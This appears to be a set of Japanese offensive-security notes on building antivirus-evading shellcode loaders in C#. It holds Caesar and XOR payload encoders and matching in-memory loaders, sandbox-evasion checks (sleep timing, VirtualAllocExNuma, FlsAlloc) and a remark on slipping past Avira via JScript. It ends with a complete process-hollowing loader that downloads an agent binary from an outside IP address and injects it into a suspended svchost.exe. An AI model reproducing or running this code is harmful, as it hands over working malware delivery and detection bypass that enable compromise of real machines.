## Encryption
### Caesar
ペイロードの暗号化用コード
```c#
namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] buf = new byte[752] {
                0xfc,0x48,0x83,0xe4,0xf0...
                };
                
            byte[] encoded = new byte[buf.Length];
            for(int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 8) & 0xFF);
            }
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
			foreach(byte b in encoded)
			{
			    hex.AppendFormat("0x{0:x2}, ", b);
			}
			
			Console.WriteLine("The payload is: " + hex.ToString());
		}
	}
}
```

復号
```c#
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, 
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, 
                  uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
            UInt32 dwMilliseconds);
        
        static void Main(string[] args)
        {
            byte[] buf = new byte[752] {0xfc,0x48,0x83,0xe4...};
              
            for(int i = 0; i < buf.Length; i++)
			{
			    buf[i] = (byte)(((uint)buf[i] - 8) & 0xFF);
			}
			
            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, 
                IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

### XOR
暗号化
```c#
namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] buf = new byte[752] {
                0xfc,0x48,0x83,0xe4,0xf0...};
            byte key = 0x3c;
            byte[] encoded = new byte[buf.Length];
            for(int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)((uint)buf[i] ^ key);
            }
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
			foreach(byte b in encoded)
			{
			    hex.AppendFormat("0x{0:x2}, ", b);
			}
			
			Console.WriteLine("The payload is: " + hex.ToString());
		}
	}
}
```

```c#
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, 
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, 
                  uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
            UInt32 dwMilliseconds);
        
        static void Main(string[] args)
        {
            byte[] buf = new byte[752] {
              0xfc,0x48,0x83,0xe4...};
            byte key = 0x3c;
            
            for(int i = 0; i < buf.Length; i++)
			{
			    buf[i] = (byte)((uint)buf[i] ^ key);
			}
			
            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, 
                IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

## Sleep Timer
Sleep呼び出し
```c#
[DllImport("kernel32.dll")]
static extern void Sleep(uint dwMilliseconds);
        
static void Main(string[] args)
{
    DateTime t1 = DateTime.Now;
    Sleep(2000);
    double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
    if(t2 < 1.5)
    {
        return;
    }
```

sleep + XORペイロード
```c#
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
                  uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle,
            UInt32 dwMilliseconds);
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            byte[] buf = new byte[826] { 0xc0, 0x74, ...};
            byte key = 0x3c;


            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ key);
            }

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
                IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

Aviraは↑これをJScriptに変換すれば検知できなくなる

## Non-emulated APIs
VirtualAllocExNuma + FlsAlloc
```c#
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
                  uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle,
            UInt32 dwMilliseconds);
            
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        
		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, 
		    uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
		    
		[DllImport("kernel32.dll")]
		static extern IntPtr GetCurrentProcess();
		
		[DllImport("kernel32.dll")]
        static extern uint FlsAlloc(IntPtr lpCallback);
        const uint FLS_OUT_OF_INDEXES = 0xFFFFFFFF;
        
        static void Main(string[] args)
        {
			IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
			if(mem == null)
			{
			    return;
			}
			
			uint flsIndex = FlsAlloc(IntPtr.Zero);
			if(flsIndex == FLS_OUT_OF_INDEXES)
			{
				return;
			}
			
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            byte[] buf = new byte[826] { 0xc0, 0x74, ...};
            byte key = 0x3c;


            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ key);
            }

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
                IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

## build方法によるバイパス
dotnetを利用してビルドする
csprojのビルドをx64対象にするのを忘れないようにする
```
dotnet build -r win-x64 -c Release
```

## process hollowing code
sleep + flsalloc + virtualallocexnuma
```c#
using System;
using System.Runtime.InteropServices;
using System.Net;

namespace Hollow
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(
            string lpApplicationName, string lpCommandLine,
            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
            bool bInheritHandles, uint dwCreationFlags,
            IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(
            IntPtr hProcess, int procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess, IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer, int dwSize,
            out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(
            IntPtr hProcess, IntPtr lpBaseAddress,
            byte[] lpBuffer, Int32 nSize,
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess, IntPtr lpAddress,
            uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);
        
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        
		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, 
		    uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
		    
		[DllImport("kernel32.dll")]
		static extern IntPtr GetCurrentProcess();
		
		[DllImport("kernel32.dll")]
        static extern uint FlsAlloc(IntPtr lpCallback);
        const uint FLS_OUT_OF_INDEXES = 0xFFFFFFFF;
        
        static void Main(string[] args)
        {
			IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
			if(mem == null)
			{
			    return;
			}
			
			uint flsIndex = FlsAlloc(IntPtr.Zero);
			if(flsIndex == FLS_OUT_OF_INDEXES)
			{
				return;
			}
			
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }
            // ① svchost.exeをサスペンド状態で起動
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            bool res = CreateProcess(null,
                "C:\\Windows\\System32\\svchost.exe",
                IntPtr.Zero, IntPtr.Zero, false, 0x4,
                IntPtr.Zero, null, ref si, out pi);

            if (!res)
            {
                Console.WriteLine("[-] CreateProcess failed: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] CreateProcess OK - PID: " + pi.dwProcessId);

            IntPtr hProcess = pi.hProcess;

            // ② PEBからEntryPointを特定
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            ZwQueryInformationProcess(hProcess, 0, ref bi,
                (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
            Console.WriteLine("[+] PEB: 0x" + bi.PebAddress.ToString("X"));

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            Console.WriteLine("[+] svchost Base: 0x" + svchostBase.ToString("X"));

            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr          = e_lfanew_offset + 0x28;
            uint entrypoint_rva  = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
            Console.WriteLine("[+] EntryPoint: 0x" + addressOfEntryPoint.ToString("X"));

            // ③ シェルコードをダウンロード
            byte[] buf = new WebClient()
                .DownloadData("http://192.168.45.217:8000/agent.x64_http.bin");
            Console.WriteLine("[+] Shellcode size: " + buf.Length + " bytes");

            // ④ ★ シェルコード用に新規RWXメモリを確保
            IntPtr shellcodeAddr = VirtualAllocEx(hProcess, IntPtr.Zero,
                (uint)buf.Length, 0x3000, 0x40);  // MEM_COMMIT|RESERVE, PAGE_EXECUTE_READWRITE

            if (shellcodeAddr == IntPtr.Zero)
            {
                Console.WriteLine("[-] VirtualAllocEx failed: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Shellcode region: 0x" + shellcodeAddr.ToString("X"));

            // ⑤ ★ シェルコードを新規領域に書き込む
            IntPtr outSize;
            WriteProcessMemory(hProcess, shellcodeAddr, buf, buf.Length, out outSize);
            Console.WriteLine("[+] Shellcode written: " + outSize + " bytes");

            // ⑥ ★ EntryPointに14バイトのjmpトランポリンを書き込む
            //    FF 25 00 00 00 00 + 8バイトアドレス
            //    = jmp qword ptr [rip+0] → shellcodeAddr
            byte[] trampoline = new byte[14];
            trampoline[0] = 0xFF;
            trampoline[1] = 0x25;
            trampoline[2] = 0x00;
            trampoline[3] = 0x00;
            trampoline[4] = 0x00;
            trampoline[5] = 0x00;
            Array.Copy(BitConverter.GetBytes((ulong)shellcodeAddr), 0, trampoline, 6, 8);

            WriteProcessMemory(hProcess, addressOfEntryPoint,
                trampoline, trampoline.Length, out outSize);
            Console.WriteLine("[+] Trampoline written at EntryPoint");

            // ⑦ スレッド再開
            uint resumed = ResumeThread(pi.hThread);
            if (resumed == 0xFFFFFFFF)
            {
                Console.WriteLine("[-] ResumeThread failed: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] ResumeThread OK");
        }
    }
}
```
